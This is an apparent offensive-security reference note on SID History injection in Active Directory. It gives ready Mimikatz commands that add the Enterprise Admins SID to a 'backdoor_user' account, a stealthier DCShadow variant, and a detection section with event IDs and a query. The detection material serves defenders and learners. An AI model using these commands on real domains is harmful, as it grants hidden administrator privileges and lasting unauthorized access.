---
title: "Attack #63 — SID History Injection"
description: "sIDHistory is an AD attribute designed for domain migrations — it preserves a user's old SID so they retain access to resources from a previous domain. An…"
category: active-directory
tags: ["active-directory", "privilege-escalation"]
tools: ["Mimikatz", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Eight/🟤 Attack #63 — SID History Injection.md"
---
# 🟤 Attack #63 — SID History Injection

***

## 📖 How It Works

`sIDHistory` is an AD attribute designed for domain migrations — it preserves a user's old SID so they retain access to resources from a previous domain. An attacker can **inject the SID of a privileged group** (e.g., Enterprise Admins, SID `S-1-5-21-<domain>-519`) into a normal user's `sIDHistory`, granting them those privileges without actually being a member of the group.

This is typically done via Mimikatz `sid::add` or DCShadow.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Domain Admin / SYSTEM on DC** | Required to modify sIDHistory |
| **Or DCShadow capability** | Alternative injection method |

***

## 💻 Full Commands

```powershell
# ── Mimikatz — inject Enterprise Admin SID into user's SID History ───────────
mimikatz.exe
privilege::debug
sid::patch
sid::add /sam:backdoor_user /new:S-1-5-21-<domain_SID>-519
# 519 = Enterprise Admins
# 512 = Domain Admins
# 500 = Administrator RID

# ── Verify ────────────────────────────────────────────────────────────────────
Get-ADUser backdoor_user -Properties sIDHistory | Select sIDHistory

# ── DCShadow method (stealthier) ──────────────────────────────────────────────
# Terminal 1 (SYSTEM): lsadump::dcshadow /object:backdoor_user /attribute:sidHistory /value:S-1-5-21-...-519
# Terminal 2 (DA): lsadump::dcshadow /push
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4765** | Security Log (DC) | SID History was added to an account |
| **4766** | Security Log (DC) | SID History add attempt failed |
| **4738** | Security Log (DC) | User account changed — sIDHistory modified |

**Detection tip:** Query for users with `sIDHistory` populated: `Get-ADUser -Filter {sIDHistory -like "*"} -Properties sIDHistory`

***

## 🔗 Attack Chain Context

```
[SID History] ──→ Invisible Privilege Escalation via SID Injection
         │
         ├──→ 🔑 User appears normal but has hidden EA/DA privileges
         ├──→ 🔗 Used for: cross-domain trust abuse (#68), persistence
         └──→ 💀 Defeated by: audit sIDHistory, SID filtering on trusts, monitor 4765
```

***

> ✅ **Attack #63 — SID History Injection complete.**
